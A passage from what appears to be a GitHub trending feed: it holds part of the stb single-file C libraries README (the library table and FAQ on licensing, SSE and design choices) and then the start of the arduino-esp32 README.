&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;a href="stb_voxel_render.h"&gt;stb_voxel_render.h&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;0.89&lt;/td&gt;
&lt;td&gt;3D graphics&lt;/td&gt;
&lt;td&gt;3807&lt;/td&gt;
&lt;td&gt;Minecraft-esque voxel rendering "engine" with many more features&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;a href="stb_dxt.h"&gt;stb_dxt.h&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;1.09&lt;/td&gt;
&lt;td&gt;3D graphics&lt;/td&gt;
&lt;td&gt;730&lt;/td&gt;
&lt;td&gt;Fabian "ryg" Giesen's real-time DXT compressor&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;a href="stb_perlin.h"&gt;stb_perlin.h&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;0.5&lt;/td&gt;
&lt;td&gt;3D graphics&lt;/td&gt;
&lt;td&gt;428&lt;/td&gt;
&lt;td&gt;revised Perlin noise (3D input, 1D output)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;a href="stb_easy_font.h"&gt;stb_easy_font.h&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;1.1&lt;/td&gt;
&lt;td&gt;3D graphics&lt;/td&gt;
&lt;td&gt;305&lt;/td&gt;
&lt;td&gt;quick-and-dirty easy-to-deploy bitmap font for printing frame rate, etc&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;a href="stb_tilemap_editor.h"&gt;stb_tilemap_editor.h&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;0.41&lt;/td&gt;
&lt;td&gt;game dev&lt;/td&gt;
&lt;td&gt;4161&lt;/td&gt;
&lt;td&gt;embeddable tilemap editor&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;a href="stb_herringbone_wang_tile.h"&gt;stb_herringbone_wa...&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;0.7&lt;/td&gt;
&lt;td&gt;game dev&lt;/td&gt;
&lt;td&gt;1221&lt;/td&gt;
&lt;td&gt;herringbone Wang tile map generator&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;a href="stb_c_lexer.h"&gt;stb_c_lexer.h&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;0.11&lt;/td&gt;
&lt;td&gt;parsing&lt;/td&gt;
&lt;td&gt;966&lt;/td&gt;
&lt;td&gt;simplify writing parsers for C-like languages&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;a href="stb_divide.h"&gt;stb_divide.h&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;0.93&lt;/td&gt;
&lt;td&gt;math&lt;/td&gt;
&lt;td&gt;430&lt;/td&gt;
&lt;td&gt;more useful 32-bit modulus e.g. "euclidean divide"&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;a href="stb_connected_components.h"&gt;stb_connected_comp...&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;0.96&lt;/td&gt;
&lt;td&gt;misc&lt;/td&gt;
&lt;td&gt;1049&lt;/td&gt;
&lt;td&gt;incrementally compute reachability on grids&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;a href="stb.h"&gt;stb.h&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;2.35&lt;/td&gt;
&lt;td&gt;misc&lt;/td&gt;
&lt;td&gt;14455&lt;/td&gt;
&lt;td&gt;helper functions for C, mostly redundant in C++; basically author's personal stuff&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;a href="stb_leakcheck.h"&gt;stb_leakcheck.h&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;0.6&lt;/td&gt;
&lt;td&gt;misc&lt;/td&gt;
&lt;td&gt;194&lt;/td&gt;
&lt;td&gt;quick-and-dirty malloc/free leak-checking&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;&lt;a href="stb_include.h"&gt;stb_include.h&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;0.02&lt;/td&gt;
&lt;td&gt;misc&lt;/td&gt;
&lt;td&gt;295&lt;/td&gt;
&lt;td&gt;implement recursive #include support, particularly for GLSL&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Total libraries: 22&lt;br&gt;
Total lines of C code: 56549&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-faq" class="anchor" aria-hidden="true" href="#faq"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;FAQ&lt;/h2&gt;
&lt;h4&gt;&lt;a id="user-content-whats-the-license" class="anchor" aria-hidden="true" href="#whats-the-license"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;What's the license?&lt;/h4&gt;
&lt;p&gt;These libraries are in the public domain. You can do anything you
want with them. You have no legal obligation
to do anything else, although I appreciate attribution.&lt;/p&gt;
&lt;p&gt;They are also licensed under the MIT open source license, if you have lawyers
who are unhappy with public domain. Every source file includes an explicit
dual-license for you to choose from.&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content--are-there-other-single-file-public-domainopen-source-libraries-with-minimal-dependencies-out-there" class="anchor" aria-hidden="true" href="#-are-there-other-single-file-public-domainopen-source-libraries-with-minimal-dependencies-out-there"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;a name="user-content-other_libs"&gt;&lt;/a&gt; Are there other single-file public-domain/open source libraries with minimal dependencies out there?&lt;/h4&gt;
&lt;p&gt;&lt;a href="https://github.com/nothings/single_file_libs"&gt;Yes.&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-if-i-wrap-an-stb-library-in-a-new-library-does-the-new-library-have-to-be-public-domainmit" class="anchor" aria-hidden="true" href="#if-i-wrap-an-stb-library-in-a-new-library-does-the-new-library-have-to-be-public-domainmit"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;If I wrap an stb library in a new library, does the new library have to be public domain/MIT?&lt;/h4&gt;
&lt;p&gt;No, because it's public domain you can freely relicense it to whatever license your new
library wants to be.&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-whats-the-deal-with-sse-support-in-gcc-based-compilers" class="anchor" aria-hidden="true" href="#whats-the-deal-with-sse-support-in-gcc-based-compilers"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;What's the deal with SSE support in GCC-based compilers?&lt;/h4&gt;
&lt;p&gt;stb_image will either use SSE2 (if you compile with -msse2) or
will not use any SIMD at all, rather than trying to detect the
processor at runtime and handle it correctly. As I understand it,
the approved path in GCC for runtime-detection require
you to use multiple source files, one for each CPU configuration.
Because stb_image is a header-file library that compiles in only
one source file, there's no approved way to build both an
SSE-enabled and a non-SSE-enabled variation.&lt;/p&gt;
&lt;p&gt;While we've tried to work around it, we've had multiple issues over
the years due to specific versions of gcc breaking what we're doing,
so we've given up on it. See &lt;a href="https://github.com/nothings/stb/issues/280"&gt;https://github.com/nothings/stb/issues/280&lt;/a&gt;
and &lt;a href="https://github.com/nothings/stb/issues/410"&gt;https://github.com/nothings/stb/issues/410&lt;/a&gt; for examples.&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-some-of-these-libraries-seem-redundant-to-existing-open-source-libraries-are-they-better-somehow" class="anchor" aria-hidden="true" href="#some-of-these-libraries-seem-redundant-to-existing-open-source-libraries-are-they-better-somehow"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Some of these libraries seem redundant to existing open source libraries. Are they better somehow?&lt;/h4&gt;
&lt;p&gt;Generally they're only better in that they're easier to integrate,
easier to use, and easier to release (single file; good API; no
attribution requirement). They may be less featureful, slower,
and/or use more memory. If you're already using an equivalent
library, there's probably no good reason to switch.&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-can-i-link-directly-to-the-table-of-stb-libraries" class="anchor" aria-hidden="true" href="#can-i-link-directly-to-the-table-of-stb-libraries"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Can I link directly to the table of stb libraries?&lt;/h4&gt;
&lt;p&gt;You can use &lt;a href="https://github.com/nothings/stb#stb_libs"&gt;this URL&lt;/a&gt; to link directly to that list.&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-why-do-you-list-lines-of-code-its-a-terrible-metric" class="anchor" aria-hidden="true" href="#why-do-you-list-lines-of-code-its-a-terrible-metric"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Why do you list "lines of code"? It's a terrible metric.&lt;/h4&gt;
&lt;p&gt;Just to give you some idea of the internal complexity of the library,
to help you manage your expectations, or to let you know what you're
getting into. While not all the libraries are written in the same
style, they're certainly similar styles, and so comparisons between
the libraries are probably still meaningful.&lt;/p&gt;
&lt;p&gt;Note though that the lines do include both the implementation, the
part that corresponds to a header file, and the documentation.&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-why-single-file-headers" class="anchor" aria-hidden="true" href="#why-single-file-headers"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Why single-file headers?&lt;/h4&gt;
&lt;p&gt;Windows doesn't have standard directories where libraries
live. That makes deploying libraries in Windows a lot more
painful than open source developers on Unix-derivates generally
realize. (It also makes library dependencies a lot worse in Windows.)&lt;/p&gt;
&lt;p&gt;There's also a common problem in Windows where a library was built
against a different version of the runtime library, which causes
link conflicts and confusion. Shipping the libs as headers means
you normally just compile them straight into your project without
making libraries, thus sidestepping that problem.&lt;/p&gt;
&lt;p&gt;Making them a single file makes it very easy to just
drop them into a project that needs them. (Of course you can
still put them in a proper shared library tree if you want.)&lt;/p&gt;
&lt;p&gt;Why not two files, one a header and one an implementation?
The difference between 10 files and 9 files is not a big deal,
but the difference between 2 files and 1 file is a big deal.
You don't need to zip or tar the files up, you don't have to
remember to attach &lt;em&gt;two&lt;/em&gt; files, etc.&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-why-stb-is-this-something-to-do-with-set-top-boxes" class="anchor" aria-hidden="true" href="#why-stb-is-this-something-to-do-with-set-top-boxes"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Why "stb"? Is this something to do with Set-Top Boxes?&lt;/h4&gt;
&lt;p&gt;No, they are just the initials for my name, Sean T. Barrett.
This was not chosen out of egomania, but as a moderately sane
way of namespacing the filenames and source function names.&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-will-you-add-more-image-types-to-stb_imageh" class="anchor" aria-hidden="true" href="#will-you-add-more-image-types-to-stb_imageh"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Will you add more image types to stb_image.h?&lt;/h4&gt;
&lt;p&gt;No. As stb_image use has grown, it has become more important
for us to focus on security of the codebase. Adding new image
formats increases the amount of code we need to secure, so it
is no longer worth adding new formats.&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-do-you-have-any-advice-on-how-to-create-my-own-single-file-library" class="anchor" aria-hidden="true" href="#do-you-have-any-advice-on-how-to-create-my-own-single-file-library"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Do you have any advice on how to create my own single-file library?&lt;/h4&gt;
&lt;p&gt;Yes. &lt;a href="https://github.com/nothings/stb/blob/master/docs/stb_howto.txt"&gt;https://github.com/nothings/stb/blob/master/docs/stb_howto.txt&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-why-public-domain" class="anchor" aria-hidden="true" href="#why-public-domain"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Why public domain?&lt;/h4&gt;
&lt;p&gt;I prefer it over GPL, LGPL, BSD, zlib, etc. for many reasons.
Some of them are listed here:
&lt;a href="https://github.com/nothings/stb/blob/master/docs/why_public_domain.md"&gt;https://github.com/nothings/stb/blob/master/docs/why_public_domain.md&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-why-c" class="anchor" aria-hidden="true" href="#why-c"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Why C?&lt;/h4&gt;
&lt;p&gt;Primarily, because I use C, not C++. But it does also make it easier
for other people to use them from other languages.&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-why-not-c99-stdinth-declare-anywhere-etc" class="anchor" aria-hidden="true" href="#why-not-c99-stdinth-declare-anywhere-etc"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Why not C99? stdint.h, declare-anywhere, etc.&lt;/h4&gt;
&lt;p&gt;I still use MSVC 6 (1998) as my IDE because it has better human factors
for me than later versions of MSVC.&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>nothings</author><guid isPermaLink="false">https://github.com/nothings/stb</guid><pubDate>Tue, 04 Feb 2020 00:07:00 GMT</pubDate></item><item><title>espressif/arduino-esp32 #8 in C, This week</title><link>https://github.com/espressif/arduino-esp32</link><description>&lt;p&gt;&lt;i&gt;Arduino core for the ESP32&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;h1&gt;&lt;a id="user-content-arduino-core-for-the-esp32" class="anchor" aria-hidden="true" href="#arduino-core-for-the-esp32"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Arduino core for the ESP32&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://travis-ci.org/espressif/arduino-esp32" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/99b7b50e418e6ed0e37794fd520fd722396aa5e2/68747470733a2f2f7472617669732d63692e6f72672f6573707265737369662f61726475696e6f2d65737033322e7376673f6272616e63683d6d6173746572" alt="Build Status" data-canonical-src="https://travis-ci.org/espressif/arduino-esp32.svg?branch=master" style="max-width:100%;"&gt;&lt;/a&gt; &lt;a target="_blank" rel="noopener noreferrer" href="https://github.com/espressif/arduino-esp32/workflows/ESP32%20Arduino%20CI/badge.svg"&gt;&lt;img src="https://github.com/espressif/arduino-esp32/workflows/ESP32%20Arduino%20CI/badge.svg" alt="" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-need-help-or-have-a-question-join-the-chat-at-" class="anchor" aria-hidden="true" href="#need-help-or-have-a-question-join-the-chat-at-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Need help or have a question? Join the chat at &lt;a href="https://gitter.im/espressif/arduino-esp32?utm_source=badge&amp;amp;utm_medium=badge&amp;amp;utm_campaign=pr-badge&amp;amp;utm_content=badge" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/5ff24f59c743e4e0b3c245e4dc2dbbeedf1ad306/68747470733a2f2f6261646765732e6769747465722e696d2f6573707265737369662f61726475696e6f2d65737033322e737667" alt="https://gitter.im/espressif/arduino-esp32" data-canonical-src="https://badges.gitter.im/espressif/arduino-esp32.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/h3&gt;
&lt;h2&gt;&lt;a id="user-content-contents" class="anchor" aria-hidden="true" href="#contents"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contents&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#development-status"&gt;Development Status&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#installation-instructions"&gt;Installation Instructions&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#decoding-exceptions"&gt;Decoding Exceptions&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#issuebug-report-template"&gt;Issue/Bug report template&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#esp32dev-board-pinmap"&gt;ESP32Dev Board PINMAP&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
